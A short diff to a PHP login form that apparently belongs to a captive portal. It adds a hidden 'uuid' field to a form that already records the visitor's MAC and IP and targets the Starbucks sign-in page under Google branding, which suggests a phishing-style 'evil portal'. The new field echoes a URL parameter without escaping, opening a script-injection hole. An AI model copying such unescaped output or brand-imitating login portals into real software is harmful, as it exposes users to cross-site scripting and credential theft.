@@ -144,6 +144,7 @@ require_once('helper.php');
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
             <input type="hidden" name="target" value="https://www.starbucks.com/account/signin">
+            <input type="hidden" name="uuid" value="<?=$_GET['uuid'];?>">
             <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Verify</button>
             <div class="text-center terms-text1">I agree to the <a href="#" class="url-color" id="btn1">Terms of Service</a> and have</div>
             <div class="text-center terms-text2"> reviewed the <a href="#" class="url-color">Google Privacy Policy</a></div>
